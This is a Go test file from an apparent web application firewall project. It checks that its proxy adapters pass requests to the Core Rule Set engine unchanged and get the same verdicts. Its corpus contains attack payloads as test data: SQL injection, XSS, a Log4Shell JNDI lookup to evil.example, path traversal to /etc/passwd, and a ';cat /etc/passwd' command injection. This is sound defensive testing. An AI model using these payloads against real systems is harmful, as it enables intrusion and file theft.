// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package crs

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"slices"
	"sort"
	"strings"
	"sync"
	"testing"
	"time"

	"google.golang.org/protobuf/encoding/protojson"

	enginev1 "github.com/inkwall-dev/inkwall/api/engine/v1"
	"github.com/inkwall-dev/inkwall/pkg/adapters/httpcheck"
	"github.com/inkwall-dev/inkwall/pkg/pipeline"
	"github.com/inkwall-dev/inkwall/pkg/request"
	"github.com/inkwall-dev/inkwall/pkg/rules/coraza"
)

// Adapter parity (#365): the same client request, through each adapter and
// a stand-in for its proxy (fronts_test.go), must reach the rules as the
// same request and get the same verdict as through the reverse proxy, the
// reference adapter. A difference fails the test, naming the adapter, the
// case and the field, unless parityDifferences lists it with a reason.

// parityCase is one client request, as raw HTTP/1.x bytes.
type parityCase struct {
	name string
	raw  string
}

func get(target string, headers ...string) string {
	return "GET " + target + " HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0 parity\r\nAccept: */*\r\n" +
		strings.Join(headers, "") + "\r\n"
}

func post(target, contentType, body string, headers ...string) string {
	return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0 parity\r\nAccept: */*\r\n"+
		"Content-Type: %s\r\nContent-Length: %d\r\n%s\r\n%s", target, contentType, len(body), strings.Join(headers, ""), body)
}

const form = "application/x-www-form-urlencoded"

// grpcFrame is an empty gRPC message.
const grpcFrame = "\x00\x00\x00\x00\x00"

var parityCorpus = []parityCase{
	// Clean traffic.
	{"clean get", get("/products?id=42&sort=price")},
	{"clean form", post("/login", form, "user=alice&password=correct-horse")},
	{"clean json", post("/api/cart", "application/json", `{"item":42,"qty":2}`)},
	{"empty post", post("/api/ping", form, "")},
	// CRS-style attacks: in the query, the body, a header, a cookie.
	{"sqli in query", get("/products?id=1%27%20OR%20%271%27%3D%271")},
	{"xss in form", post("/comment", form, "text=%3Cscript%3Ealert(1)%3C%2Fscript%3E")},
	{"sqli in json", post("/api/search", "application/json", `{"q":"1' OR '1'='1' -- "}`)},
	{"log4shell in header", get("/", "X-Api-Key: ${jndi:ldap://evil.example/a}\r\n")},
	{"traversal in cookie", get("/", "Cookie: file=../../../../etc/passwd\r\n")},
	{"shell in multipart", post("/upload", "multipart/form-data; boundary=b",
		"--b\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\n;cat /etc/passwd\r\n--b--\r\n")},
	// Edge cases: hosts, encodings, protocol versions, methods.
	{"host with port and case", strings.Replace(get("/"), "Host: shop.example.com", "Host: Shop.Example.COM:8080", 1)},
	{"double-encoded traversal", get("/static/%252e%252e/%252e%252e/etc/passwd")},
	{"encoded slash and semicolon", get("/a%2Fb;jsessionid=1?x=%zz")},
	{"utf-8 path", get("/caf%C3%A9?q=%E2%9C%93")},
	{"http/1.0", strings.Replace(get("/"), "HTTP/1.1", "HTTP/1.0", 1)},
	{"options", strings.Replace(get("/"), "GET", "OPTIONS", 1)},
	{"chunked body", "POST /login HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: Mozilla/5.0 parity\r\nAccept: */*\r\n" +
		"Content-Type: " + form + "\r\nTransfer-Encoding: chunked\r\n\r\n9\r\nuser=a%27\r\n0\r\n\r\n"},
	{"large body", post("/upload", form, "q="+strings.Repeat("a", 200<<10))},
	// gRPC, and WebSocket handshakes.
	{"grpc clean", post("/svc.Echo/Say", "application/grpc", grpcFrame, "Te: trailers\r\n")},
	{"grpc attack in metadata", post("/svc.Echo/Say", "application/grpc", grpcFrame, "Te: trailers\r\n", "X-Api-Key: ${jndi:ldap://evil.example/a}\r\n")},
	{"websocket attack in query", get("/ws?room=1%27%20OR%20%271%27%3D%271",
		"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: https://shop.example.com\r\n")},
}

// parityDifferences are the accepted differences from the reverse proxy,
// by adapter, then "case/field" ("*" for any case), each with its reason.
// A listed difference that no longer occurs fails the test too, so the
// list stays accurate.
var parityDifferences = map[string]map[string]string{
	"forwardauth": {
		"http/1.0/proto": "Traefik's subrequest is its own HTTP/1.1 request: the client's version isn't sent.",
		"chunked body/rule ids": "Traefik's subrequest carries its own framing (a Content-Length) besides the client's " +
			"Transfer-Encoding, so 920181 (both) matches; below the threshold (as 920181-1 in the CRS suite).",
		"chunked body/header Content-Length": "As 920181: the subrequest's own Content-Length.",
		"grpc attack in metadata/client status": "Traefik's ForwardAuth denies only on a non-2xx answer: a gRPC denial is " +
			"403 with the gRPC status in the headers, not 200 (docs/grpc.md).",
	},
	"extproc": {},
	"spoe": {
		"grpc attack in metadata/client status": "The stand-in maps the engine's status as haproxy.cfg's deny rules do; " +
			"haproxy.cfg's gRPC rule (200 with grpc-status) isn't in the stand-in.",
	},
	"check": {
		"grpc attack in metadata/client status": "/v1/check returns the verdict, not the client's answer: the proxy " +
			"calling it writes the denial, here the status alone.",
	},
}

// recordingInspector records the request each adapter hands the pipeline,
// and its verdict.
type recordingInspector struct {
	p  *pipeline.Pipeline
	mu sync.Mutex
	// got are the requests checked since the last take.
	got []checked
}

type checked struct {
	r request.Request
	v pipeline.Verdict
}

func (ri *recordingInspector) record(r *request.Request, v pipeline.Verdict) {
	c := checked{r: *r, v: v}
	c.r.Headers = r.Headers.Clone()
	c.r.Body = slices.Clone(r.Body)
	ri.mu.Lock()
	ri.got = append(ri.got, c)
	ri.mu.Unlock()
}

func (ri *recordingInspector) take() []checked {
	ri.mu.Lock()
	defer ri.mu.Unlock()
	got := ri.got
	ri.got = nil
	return got
}

func (ri *recordingInspector) Check(ctx context.Context, r *request.Request) pipeline.Verdict {
	v := ri.p.Check(ctx, r)
	ri.record(r, v)
	return v
}

func (ri *recordingInspector) CheckExchange(ctx context.Context, r *request.Request) (pipeline.Verdict, *pipeline.Exchange) {
	v, x := ri.p.CheckExchange(ctx, r)
	ri.record(r, v)
	return v, x
}

func (ri *recordingInspector) BodyLimit(r *request.Request, limit int64) int64 {
	return ri.p.BodyLimit(r, limit)
}

// checkFront asks /v1/check (pkg/adapters/httpcheck) as a proxy would:
// the client's request as a CheckRequest, in JSON. A deny is the answer,
// with the engine's status; anything else is forwarded.
func checkFront(t *testing.T, p pipeline.ExchangeInspector, upstream *url.URL) http.Handler {
	h, err := httpcheck.New(p, httpcheck.Config{MaxBodyBytes: maxBody, Logger: discard})
	if err != nil {
		t.Fatal(err)
	}
	rp := httputil.NewSingleHostReverseProxy(upstream)
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		in := &enginev1.CheckRequest{Method: r.Method, Scheme: "http", Authority: r.Host, RawUri: r.RequestURI,
			ClientIp: "127.0.0.1", PeerIp: "127.0.0.1", Body: body, Protocol: r.Proto}
		hs := clientHeaders(r)
		names := make([]string, 0, len(hs))
		for k := range hs {
			names = append(names, k)
		}
		sort.Strings(names)
		for _, k := range names {
			for _, v := range hs[k] {
				in.Headers = append(in.Headers, &enginev1.Header{Name: k, Value: v})
			}
		}
		raw, _ := protojson.Marshal(in)
		sub := httptest.NewRequest(http.MethodPost, httpcheck.Path, bytes.NewReader(raw))
		sub.Header.Set("Content-Type", httpcheck.ContentTypeJSON)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, sub)
		var out enginev1.CheckResponse
		if rec.Code != http.StatusOK || protojson.Unmarshal(rec.Body.Bytes(), &out) != nil {
			http.Error(w, "check: "+rec.Body.String(), http.StatusBadGateway)
			return
		}
		if out.GetAction() == enginev1.Action_ACTION_DENY {
			w.Header().Set("X-Request-Id", out.GetRequestId())
			w.WriteHeader(int(out.GetStatus()))
			return
		}
		r.Body = io.NopCloser(bytes.NewReader(body))
		rp.ServeHTTP(w, r)
	})
}

// seen is what parity compares: the request the rules saw, the verdict,
// and the client's answer.
type seen map[string]string

// ignoredHeaders are set by each proxy or adapter for itself.
var ignoredHeaders = []string{"X-Request-Id", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
	"X-Forwarded-Method", "X-Forwarded-Uri", "X-Forwarded-Port", "X-Forwarded-Server", "X-Real-Ip", "Forwarded"}

func describe(c checked, status int, requestID bool) seen {
	s := seen{
		"method":         c.r.Method,
		"scheme":         c.r.Scheme,
		"host":           c.r.Host,
		"raw uri":        c.r.RawURI,
		"proto":          c.r.Proto,
		"client ip":      c.r.ClientIP.String(),
		"body":           fmt.Sprintf("%d bytes %x", len(c.r.Body), c.r.Body[:min(len(c.r.Body), 64)]),
		"body truncated": fmt.Sprint(c.r.BodyTruncated),
		"action":         c.v.Action.String(),
		"status":         fmt.Sprint(c.v.Status),
		"reason":         c.v.Reason.String(),
		"rule ids":       fmt.Sprint(sortedInts(c.v.RuleIDs)),
		"client status":  fmt.Sprint(status),
	}
	// A denial names its request ID, through every adapter.
	if c.v.Action == pipeline.ActionDeny {
		s["client X-Request-Id"] = fmt.Sprint(requestID)
	}
	for name, vs := range c.r.Headers {
		name = http.CanonicalHeaderKey(name)
		if slices.Contains(ignoredHeaders, name) {
			continue
		}
		s["header "+name] = strings.Join(vs, ", ")
	}
	return s
}

func sortedInts(ids []int) []int {
	ids = slices.Clone(ids)
	slices.Sort(ids)
	return ids
}

// send writes raw to the front and returns the answer's status, and
// whether it has an X-Request-Id.
func send(t *testing.T, addr, raw string) (int, bool) {
	t.Helper()
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	if _, err := io.WriteString(conn, raw); err != nil {
		t.Fatal(err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		t.Fatalf("read the answer: %v", err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode, resp.Header.Get("X-Request-Id") != ""
}

func TestAdapterParity(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.Copy(io.Discard, r.Body)
		_, _ = io.WriteString(w, "ok")
	}))
	defer upstream.Close()
	upURL, _ := url.Parse(upstream.URL)
	eval, err := coraza.New(coraza.Config{ParanoiaLevel: 1})
	if err != nil {
		t.Fatal(err)
	}
	// One pipeline for every adapter: the policy's verdicts can't differ.
	// The body limit is the adapters' (maxBody), past the large case.
	p := pipeline.New(eval, pipeline.Config{Mode: pipeline.ModeBlock, Timeout: 10 * time.Second, MaxConcurrent: 64})
	ri := &recordingInspector{p: p}

	adapters := append([]adapter{proxyAdapter}, otherAdapters...)
	adapters = append(adapters, adapter{name: "check", front: checkFront})
	results := map[string]map[string]seen{} // adapter, case
	for _, a := range adapters {
		front := httptest.NewServer(a.front(t, ri, upURL))
		addr := strings.TrimPrefix(front.URL, "http://")
		results[a.name] = map[string]seen{}
		for _, c := range parityCorpus {
			ri.take()
			status, id := send(t, addr, c.raw)
			got := ri.take()
			if len(got) != 1 {
				t.Errorf("%s/%s: the adapter checked %d requests, want 1 (client status %d)", a.name, c.name, len(got), status)
				continue
			}
			results[a.name][c.name] = describe(got[0], status, id)
		}
		front.Close()
	}

	occurred := map[string]bool{}
	for _, a := range adapters[1:] {
		for _, c := range parityCorpus {
			ref, got := results["proxy"][c.name], results[a.name][c.name]
			if ref == nil || got == nil {
				continue
			}
			var fields []string
			for k := range ref {
				fields = append(fields, k)
			}
			for k := range got {
				if _, ok := ref[k]; !ok {
					fields = append(fields, k)
				}
			}
			slices.Sort(fields)
			for _, f := range slices.Compact(fields) {
				if ref[f] == got[f] {
					continue
				}
				key := c.name + "/" + f
				if _, ok := parityDifferences[a.name][key]; ok {
					occurred[a.name+"\x00"+key] = true
					continue
				}
				if _, ok := parityDifferences[a.name]["*/"+f]; ok {
					occurred[a.name+"\x00*/"+f] = true
					continue
				}
				t.Errorf("%s differs from the reverse proxy on %q, %s: %q, want %q", a.name, c.name, f, got[f], ref[f])
			}
		}
	}
	for name, diffs := range parityDifferences {
		for key, reason := range diffs {
			if !occurred[name+"\x00"+key] {
				t.Errorf("%s: %q is a listed difference (%s) but doesn't occur: remove it", name, key, reason)
			}
		}
	}
}
